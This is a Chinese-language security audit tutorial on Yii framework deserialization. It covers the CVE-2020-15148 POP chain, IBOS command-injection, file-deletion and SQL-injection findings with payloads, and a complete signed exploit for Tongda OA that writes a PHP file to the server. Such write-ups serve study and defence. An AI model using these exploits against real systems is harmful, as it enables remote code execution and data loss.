引言

在Web应用安全领域，代码审计是挖掘漏洞的核心手段。对于使用成熟框架（如Yii）的应用而言，审计者不仅需要理解框架自身的架构与潜在风险，还需具备将理论POP链与成品源码分析相结合的能力。本文以Yii框架为例，从反序列化漏洞的原理出发，深入剖析CVE-2020-15148的POP链构造，并结合IBOS成品源码的多个高危漏洞案例，最后以通达OA的真实利用场景收尾，完整呈现理论与实践的结合过程。

---

一、理论基石：Yii框架架构与反序列化漏洞原理

1.1 Yii的MVC与核心组件

Yii是一个高性能PHP框架，严格遵循MVC（模型-视图-控制器）模式。其核心类结构复杂，大量使用了魔术方法（如__destruct、__call）和事件机制，这些特性为反序列化漏洞的利用提供了土壤。

1.2 反序列化漏洞与POP链

PHP反序列化漏洞的根源在于unserialize()函数对用户输入的处理不当，导致攻击者可以控制对象的属性，从而在对象生命周期中（如析构时）触发危险方法。POP（Property-Oriented Programming）链即通过串联多个类的魔术方法或公开方法，最终达到任意代码执行的效果。

---

二、实践剖析：CVE-2020-15148反序列化POP链复现

2.1 环境搭建与入口点

· 版本：Yii 2.0.37 + PHP 7.4.3 + Apache
· 入口文件：在控制器中增加一个接收data参数并进行反序列化的方法：

```php
// controllers/TestController.php
namespace app\controllers;
use yii\web\Controller;
class TestController extends Controller{
    public function actionTest($data){
        return unserialize(base64_decode($data));
    }
}
```

2.2 POP链核心流程

该漏洞的触发点位于yii\db\BatchQueryResult的析构函数：

```php
public function __destruct() {
    $this->reset();  // 调用reset()
}
protected function reset() {
    // ... 
    $this->close();  // reset()中调用close()
}
public function close() {
    if ($this->_dataReader !== null) {
        $this->_dataReader->close();  // 调用_dataReader的close()
    }
}
```

攻击者可以控制$_dataReader属性，若找到一个类的close()方法能够执行任意回调，即可构成利用。

2.3 寻找close()方法

在Yii框架中，GuzzleHttp\Psr7\FnStream类存在一个__call()魔术方法，它会将不可访问的方法调用转发给自定义的闭包：

```php
public function __call($method, $args) {
    if (isset($this->_fn_{$method})) {
        return call_user_func_array($this->_fn_{$method}, $args);
    }
    // ...
}
```

因此，将$_dataReader设为FnStream的实例，并设置_fn_close = "phpinfo"，即可在close()调用时执行任意函数。

2.4 完整POP链构造

```php
namespace GuzzleHttp\Psr7 {
    class FnStream {
        var $_fn_close = "phpinfo";
    }
}
namespace yii\db {
    use GuzzleHttp\Psr7\FnStream;
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader = new FnStream();
        }
    }
}
namespace {
    use yii\db\BatchQueryResult;
    echo base64_encode(serialize(new BatchQueryResult()));
}
```

该链展示了如何从框架核心类的析构函数出发，通过可控属性一步步跳转到任意代码执行，是理论POP链在Yii中的经典应用。

---

三、实战扩展：IBOS成品源码审计案例

IBOS是一款基于Yii的企业协同办公系统，其源码中存在多个典型的漏洞类型，审计时可针对性搜索关键函数或关键字。

3.1 命令执行（搜索：shell、system、exec）

位置：system/modules/dashboard/controllers/DatabaseController.php中的actionBackup()
漏洞点：备份文件名$filename由用户可控，未经过滤直接拼接到shell命令中：

```php
$dumpFile = $backupFileName . '.sql';
shell_exec("mysqldump --host=... --user=... > $dumpFile & whoami > demo &");
```

攻击者可通过构造$filename（如&whoami>demo&）实现任意命令执行。
路由：?r=dashboard/database/backup

3.2 文件删除（搜索：unlink）

位置：同一控制器中的actionRestore()
漏洞点：删除文件时直接从$_GET获取文件名，未校验路径合法性：

```php
$fileName = $_GET['filename'];
unlink($backupPath . $fileName);
```

通过目录遍历（如../../../../config.php）可删除任意文件。
路由：?r=dashboard/database/restore

3.3 SQL注入（搜索：拼接、不安全拼接）

位置：system/modules/report/actions/api/GetList.php中的getListCondition()
漏洞点：将用户输入的$keyword['subject']直接拼接进SQL语句：

```php
$condition .= " AND subject LIKE '%" . $keyword['subject'] . "%'";
```

注入Payload：

```
') AND (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- 
```

路由：?r=report/api/GetList

3.4 版本漏洞关联

通过getVersion()获取IBOS版本（如1.1.19），可对照已知Yii漏洞库寻找历史反序列化链。例如，IBOS若使用了存在CVE-2020-15148的Yii版本，则可能存在反序列化风险。

---

四、高级结合：通达OA中的Yii反序列化实战

4.1 环境识别与入口

通达OA某版本使用了Yii 2.0.13及yii-redis组件，其入口位于/general/appbuilder/web/portal/gateway/。该路径未经严格鉴权，且视图渲染时会调用csrfMetaTags()方法，最终触发unserialize()处理Cookie中的_GET参数。

4.2 反序列化链的适配

由于通达OA剔除了原POP链中的GuzzleHttp类，需要寻找新的中间类。通过分析，发现yii\redis\Connection的__call()方法可用，其流程为：

1. BatchQueryResult析构 -> DataReader::close() -> 调用Connection::__call('closeCursor')。
2. __call()中要求$this->redisCommands包含'CLOSE CURSOR'（满足条件）。
3. 最终进入executeCommand()，在连接Redis时触发initConnection()，进而调用Component::trigger('afterOpen')。
4. Component::trigger()会遍历$_events['afterOpen']并回调，可控点最终落到yii\rest\CreateAction::run()，其内部存在call_user_func。

4.3 绕过安全机制

· Hash验证：Cookie值需为hash + 序列化数据，hash由cookieValidationKey（在通达OA中为tdide2）计算，攻击者需知道该密钥。
· 全局转义绕过：通达OA对$_GET等超全局变量未加addslashes，因此可通过_GET参数传递payload，避免引号被转义。

4.4 最终EXP构造

```php
namespace yii\rest {
    class CreateAction {
        public $checkAccess = "assert";
        public $id = "file_put_contents('a.php','<?php phpinfo();?>')";
    }
}
namespace yii\base {
    class Component {
        private $_events = ["afterOpen" => [[[new CreateAction(), "run"], "run"]]];
    }
}
namespace yii\redis {
    class Connection extends Component {
        public $redisCommands = ["CLOSE CURSOR"];
        public $port = 80;
        private $_socket = false;
    }
}
namespace yii\db {
    class DataReader {
        private $_statement;
        public function __construct() {
            $this->_statement = new Connection();
        }
    }
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader = new DataReader();
        }
    }
}
// 计算hash
$data = serialize(new BatchQueryResult());
$hash = hash_hmac("sha256", $data, "tdide2", false);
$payload = urlencode($data);
$cookie = $hash . $payload;
// 通过GET请求发送Cookie: _GET=$cookie
```

---

五、总结：从理论到实战的思维跃迁

1. 理论指导实践：理解Yii的魔术方法、事件机制和常见POP链构造模式，能帮助我们在审计成品源码时快速定位潜在的反序列化触发点。
2. 实践反哺理论：IBOS和通达OA的案例表明，实际应用往往会删减或修改框架组件，导致通用POP链失效。审计者必须结合具体环境，动态分析可用的类和方法，这需要对框架底层原理有深刻理解。
3. 自动化与手工结合：在代码审计中，可先通过关键字搜索（如unserialize、call_user_func、shell_exec）定位可疑点，再手工追踪数据流，最终构造PoC验证。

Yii框架的安全研究远不止于此，随着版本的迭代，新的POP链和绕过技术仍在不断涌现。唯有坚持理论与实践的结合，才能在攻防博弈中占据主动。

---

参考资料

· 奇安信攻防社区：通达OA反序列化分析
· Yii 2.x 反序列化漏洞（CVE-2020-15148）分析
· IBOS源码审计案例
